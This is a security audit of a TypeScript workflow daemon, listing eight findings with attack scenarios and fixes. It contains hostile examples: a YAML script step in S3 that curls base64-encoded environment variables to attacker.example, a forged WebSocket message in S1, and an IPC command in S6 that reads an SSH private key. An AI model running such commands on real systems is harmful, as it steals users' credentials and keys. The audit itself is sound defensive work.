# Security Audit V2

Audited: Secret.ts, SecretProvider.ts, LogMasker.ts, CommandHandler.ts, McpServer.ts, WorkerAdapter.ts, WebSocketServer.ts, WorkerPool.ts, RunCommand.ts, FlowValidator.ts

---

## HIGH Severity

### S1 - No authentication on WebSocket worker channel; any local process can act as a worker

**File:** WebSocketServer.ts:27 (binding) + Daemon.ts:88-169 (message dispatch)

**Vulnerability type:** Missing authentication / unauthorized process impersonation

The WebSocket server binds to `127.0.0.1` but accepts any connection without authentication (noted in the v1 comment at line 9). All message types — `inject_steps`, `step_completed`, `step_failed`, `log` — are processed without verifying the sender is a legitimate worker. Only the `ready` message triggers a PID check (WorkerPool.ts:74), and that check relies on a self-reported field (see S2).

**Attack scenario:** An attacker process on the same machine connects to the daemon WebSocket port. It sends:

```json
{
	"type": "step_completed",
	"executionId": "<known-id>",
	"stepId": "<step>",
	"output": { "result": "attacker-controlled" }
}
```

The daemon marks the step completed with poisoned output. Downstream steps that consume `{{steps.<step>.result}}` receive the attacker-controlled value — model prompts are injected, script env vars are set from attacker data, file paths are poisoned. The entire execution completes silently with corrupted state.

The attacker can also send `step_failed` to kill any running execution, or `inject_steps` to add arbitrary model/script steps to any active execution, bypassing the flow validator entirely.

**Fix:** Implement a shared secret between daemon and workers. Generate a random token at daemon startup, pass it to workers via `FLOW_WORKER_TOKEN` env var (set in WorkerPool.spawnWorker), require every incoming WebSocket message to carry it in a header or first-message handshake, and terminate connections that fail the check.

---

### S2 - PID in 'ready' message is self-reported; no OS-level process verification

**File:** WorkerPool.ts:71-86

**Vulnerability type:** Self-reported identity, PID spoofing

`registerWorker(ws, message.pid)` accepts the PID value from the JSON message body. `spawnedPids.has(pid)` checks whether the CLAIMED PID was previously spawned, but there is no OS-level binding between the WebSocket connection and the claimed PID. Any process that can connect to the WebSocket can send `{type:'ready', pid:<valid-pid>}` with any PID in the `spawnedPids` set.

**Attack scenario:** Daemon spawns worker PID 12345 (visible via `ps`, `/proc`, or Task Manager). Before PID 12345 connects, attacker sends `{type:'ready', pid:12345}`. The daemon accepts the registration, clears PID 12345's connect timeout (so the real worker is killed by the timeout since the timer was cleared and the slot is considered filled), and marks the attacker socket as idle. The daemon then assigns the next step to the attacker's socket. If the real worker later connects and sends `ready`, it is rejected (`spawnedPids` no longer contains 12345) and terminated.

Combined with S1, the attacker can register as a worker AND send arbitrary step results.

**Fix:** OS-level PID verification is platform-specific and complex. The correct fix is to address S1 (shared secret token), which makes PID spoofing irrelevant. As a secondary hardening measure, retain entries in `spawnedPids` until process exit rather than deleting them on first `ready` — so a second `ready` with the same PID from a different socket is rejected.

---

## MEDIUM Severity

### S3 - Workers inherit full process.env including daemon-level secrets

**File:** WorkerPool.ts:38-40

**Vulnerability type:** Credential exposure to child processes

`env: { ...process.env, FLOW_DAEMON_PORT: ..., FLOW_WS_PORT: ... }` spreads the entire daemon environment into every worker subprocess. The daemon's environment may include API keys, database credentials, SSH keys, or cloud provider tokens present in the user's shell at daemon startup time.

**Attack scenario:** A flow YAML containing a `script` step can exfiltrate the full environment:

```yaml
steps:
    - id: exfil
      type: script
      script: 'curl https://attacker.example/collect -d "$(env | base64)"'
```

If the daemon was started in a shell that had `AWS_SECRET_ACCESS_KEY`, `ANTHROPIC_API_KEY`, or any other credential set, the script step receives and exfiltrates them. The user running the flow need not be the attacker — a flow YAML fetched from an untrusted source, or injected via S1, produces the same outcome.

**Fix:** Spawn workers with an explicit minimal environment: only `PATH`, `HOME`, `TMPDIR`/`TEMP`, and the flow-specific vars (`FLOW_DAEMON_PORT`, `FLOW_WS_PORT`). If specific env vars need to propagate (e.g., for system tools), use an explicit allowlist in the daemon config rather than a wildcard spread.

---

### S4 - McpServer token exposed as URL query parameter

**File:** McpServer.ts:120-122

**Vulnerability type:** Token leakage in URL

The MCP config embeds the bearer token directly in the URL query string:

```json
{ "url": "http://127.0.0.1:<port>/mcp?token=<uuid>" }
```

URL query parameters appear in: (1) web server and proxy access logs, (2) error messages from ClaudeLauncher or any HTTP middleware, (3) `ps aux` / `wmic` output if the URL is passed as a CLI argument by the MCP client, (4) shell history if the URL is printed and copy-pasted.

**Attack scenario:** If the system has a web proxy or any request-logging middleware (common in corporate environments), the full URL including the token is logged. An attacker with access to those logs can replay the token against the still-running MCP HTTP server during the lifetime of the step execution and inject arbitrary steps via `provideSteps`.

**Fix:** Pass the token as an HTTP `Authorization: Bearer <token>` header in the MCP config. Check `req.headers['authorization']` in `handleRequest` instead of (or in addition to) the query param. Most MCP clients support bearer auth headers natively.

---

### S5 - LogMasker skips secrets shorter than 4 characters

**File:** LogMasker.ts:17

**Vulnerability type:** Incomplete secret masking — short secrets logged in plaintext

`if (variant.length < 4) continue` skips any encoding variant shorter than 4 bytes. For a 1, 2, or 3-character plaintext secret:

- A 3-char secret `abc` has plaintext `variant.length === 3` → the plaintext variant is skipped and never masked.
- The base64 no-pad variant of a 2-byte secret is 2 characters → skipped.
- The hex variant of a 1-byte secret is 2 characters → skipped.

**Attack scenario:** An environment variable holding a 3-character PIN or API key suffix is referenced via `env://PIN`. When a step logs output containing the PIN value, LogMasker does not redact it. The plaintext appears unredacted in `~/.flow-daemon/logs/` and is returned in step output accessible to the client.

**Fix:** Lower the threshold to apply to the plaintext variant separately: always register the raw plaintext if it is non-empty, regardless of length. Apply the `< 4` skip only to derived encoding variants that could produce too many false-positive matches (e.g., a 1-char hex variant like `"a"` would match everywhere). Current code skips the plaintext `"abc"` entirely, which is the real regression.

---

### S6 - Arbitrary file read via unvalidated flowFile path in CommandHandler

**File:** CommandHandler.ts:41-53

**Vulnerability type:** Unauthorized file disclosure (path traversal via IPC)

The daemon accepts a `flowFile` path from any client IPC command and reads it with `fs.readFileSync(flowFile, 'utf8')` without any restriction to a project directory or workspace boundary. YAML parse errors include fragments of the file content via `String(err)` (line 52), which propagates back to the client response.

**Attack scenario:** Any process with access to the daemon client channel can send:

```json
{ "type": "run", "flowFile": "/home/victim/.ssh/id_rsa", "cwd": "/tmp" }
```

The daemon reads the file and returns a PARSE_ERROR whose `message` contains content from the SSH key (yaml.load error messages include the offending line/bytes). Even without error disclosure, the daemon can be used to verify file existence for any path the daemon process can access.

If combined with S1 (no WebSocket auth for workers), an attacker who can inject a `step_completed` message with a known executionId can also manipulate which file paths are used in subsequent steps.

**Fix:** Validate that `flowFile` resolves to a path within `cmd.cwd` or within a project root (`.agent-fleet` ancestor directory). Apply containment logic equivalent to SecretProvider's path traversal check (SecretProvider.ts:49-54).

---

## LOW Severity

### S7 - MCP config file in world-readable tmpdir may expose token on Windows

**File:** McpServer.ts:124-127

**Vulnerability type:** Token leakage via insecure temp file permissions

The MCP config is written to `os.tmpdir()` with `mode: 0o600`. On Unix this is effective. On Windows, `%TEMP%` is per-user but the POSIX mode argument passed to `fs.writeFileSync` is silently ignored — file ACLs are inherited from the directory, which may allow other users on the same system to read the file.

**Attack scenario:** On a shared Windows machine, another user with read access to `%TEMP%` reads `flow-mcp-<executionId>-<timestamp>.json`, extracts the token URL, and calls the MCP provideSteps endpoint during the brief window the step is running to inject malicious steps.

**Fix:** Write the config to a subdirectory of the daemon dir (`~/.flow-daemon/mcp-configs/`) which already has `mode: 0o700` set at startup (Daemon.ts:71). On Unix this is equivalent; on Windows the daemon dir's inherited ACL is per-user.

---

### S8 - McpServer body reader uses String(chunk) instead of explicit Buffer encoding

**File:** McpServer.ts:277

**Vulnerability type:** Non-explicit encoding, potential garbled data

`String(chunk)` on a Node.js Buffer invokes `Buffer.prototype.toString()` with no encoding argument (defaults to UTF-8 in current Node). In unusual environments or if `chunk` is not a plain Buffer, `String(chunk)` may invoke `Object.prototype.toString`, returning `[object Object]` and silently dropping the body — causing the JSON parse to fail without a useful error and closing the request without processing.

**Fix:** Replace with `(chunk as Buffer).toString('utf8')` for explicit encoding.

---

## Score: 4/10
